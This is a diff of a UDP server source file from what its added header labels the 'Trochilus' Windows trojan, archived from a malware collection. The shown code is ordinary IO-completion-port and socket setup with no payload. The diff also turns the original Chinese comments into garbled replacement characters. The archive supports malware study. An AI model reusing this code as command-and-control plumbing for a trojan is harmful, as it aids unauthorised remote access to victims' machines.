@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <Winsock2.h>
 #include "UdpServer.h"
@@ -47,7 +58,7 @@ BOOL UdpServer::Start(USHORT listenPort, DWORD dwWorkerThreadNumCpuMultipe)
 	BOOL bSuccess = FALSE;
 	do 
 	{
-		//´´½¨IOÍê³É¶Ë¿Ú
+		//ï¿½ï¿½ï¿½ï¿½IOï¿½ï¿½É¶Ë¿ï¿½
 		m_hIocp = ::CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);
 		if (! m_hIocp)
 		{
@@ -55,7 +66,7 @@ BOOL UdpServer::Start(USHORT listenPort, DWORD dwWorkerThreadNumCpuMultipe)
 			break;
 		}
 
-		//³õÊ¼»¯udp socket
+		//ï¿½ï¿½Ê¼ï¿½ï¿½udp socket
 // 		WSADATA wsaData;
 // 		if (::WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 // 		{
@@ -70,7 +81,7 @@ BOOL UdpServer::Start(USHORT listenPort, DWORD dwWorkerThreadNumCpuMultipe)
 			break;
 		}
 
-		//°ó¶¨
+		//ï¿½ï¿½
 		sockaddr_in localAddr = {0};
 		localAddr.sin_family = AF_INET;
 		localAddr.sin_addr.S_un.S_addr = INADDR_ANY;
@@ -81,21 +92,21 @@ BOOL UdpServer::Start(USHORT listenPort, DWORD dwWorkerThreadNumCpuMultipe)
 			break;
 		}
 
-		//ºÍioÍê³É¶Ë¿Ú°ó¶¨
+		//ï¿½ï¿½ioï¿½ï¿½É¶Ë¿Ú°ï¿½
 		if(NULL == ::CreateIoCompletionPort((HANDLE)m_udpSocket, m_hIocp, UDP_SOCKET_IOCP_KEY, 0))
 		{
 			errorLog(_T("bind io and udp failed WE:%d"), WSAGetLastError());
 			break;
 		}
 
-		//»ñÈ¡CPU¸öÊý
+		//ï¿½ï¿½È¡CPUï¿½ï¿½ï¿½ï¿½
 		SYSTEM_INFO sysInfo = {0};
 		::GetSystemInfo(&sysInfo);	
 
-		//¹¤×÷ÕßÏß³Ì¸öÊý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß³Ì¸ï¿½ï¿½ï¿½
 		int dwNumberOfWorkThreads = (int)sysInfo.dwNumberOfProcessors * dwWorkerThreadNumCpuMultipe;
 
-		//´´½¨¹¤×÷ÕßÏß³Ì
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß³ï¿½
 		for (int i = 0; i < dwNumberOfWorkThreads; i++)
 		{
 			HANDLE hThread = ::CreateThread(NULL, 0, UdpServer::WorkerThread, this, 0, NULL);
